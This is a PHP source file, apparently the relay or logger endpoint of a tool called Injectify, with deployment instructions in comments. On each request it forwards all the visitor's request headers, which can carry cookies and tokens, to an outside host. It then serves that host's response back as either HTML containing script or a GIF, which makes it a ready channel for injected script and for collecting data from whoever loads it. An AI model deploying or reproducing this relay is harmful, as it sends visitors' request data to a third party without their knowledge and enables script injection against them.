<?php
    //    _____        _           _   _  __       
    //    \_   \_ __  (_) ___  ___| |_(_)/ _|_   _ 
    //     / /\/ '_ \ | |/ _ \/ __| __| | |_| | | |
    //  /\/ /_ | | | || |  __/ (__| |_| |  _| |_| |
    //  \____/ |_| |_|/ |\___|\___|\__|_|_|  \__, |
    //         |__/  https://samdd.me   |___/ 
    /////////////////////////////////////////////////
    //
    // 1. Place this file as 'index.php' in an empty folder
    // 2. Get the url to the folder and generate a payload

    // EXAMPLE:
    //    /var/www/
    //        - logger/
    //             - index.php
    //    Proxy URL = https://mysite.com/logger/
    //    Proxy URL = https://mysite.com/logger.php?

    // ADVANCED:
    //    - To inspect the contents of the log, append '&view' to the request URL
    //    - Alternatively you can add pass the BASE64 as a query string

    // INCREASE APACHE2 URL LIMITS:
    //    sudo nano /etc/apache2/apache2.conf
    //    add the line `LimitRequestLine 1000000` to the bottom
    //    {CTRL-X}  {Y}  {ENTER}
    //    sudo service apache2 restart
    if (isset($_SERVER['QUERY_STRING'])) {
        $base64 = $_SERVER['QUERY_STRING'];
    } else {
        $base64 = explode("/", $_SERVER['REQUEST_URI']);
        $base64 = $base64[count($base64) - 1];
    }
    $injectifyURL = "http://injectify.samdd.me/record/" . $base64;

    $params = array('http' => array(
        'method' => 'POST',
        'content' => 'forwarded-headers=' . urlencode(json_encode(getallheaders()))
    ));
    $ctx = stream_context_create($params);
    $fp = @fopen($injectifyURL, 'rb', false, $ctx);
    if (!$fp) {
        throw new Exception("Problem with $injectifyURL, $php_errormsg");
    }
    
    $response = @stream_get_contents($fp);
    if ($response === false) {
        throw new Exception("Problem reading data from $injectifyURL, $php_errormsg");
    }

    if (substr($base64, -5) == '&view') {
        header("Content-type: application/json");
        $json = substr($base64, 0, -5);
        if (substr($json, -1) == '$') {
            $json = substr($json, 0, -1);
        }
        $json = json_encode(json_decode(urldecode(base64_decode(strrev($json)))), JSON_PRETTY_PRINT);
        if (json_decode($json)) {
            echo $json;
        } else {
            echo json_encode(array('error' => true, 'message' => 'Failed to decode base64 string to JSON'), JSON_PRETTY_PRINT);
        }
    } else {
        if (preg_match('/<script>/', $response)) {
            header("Content-type: text/html");
        } else {
            header("Content-type: image/gif");
        }
        echo $response;
    }
?>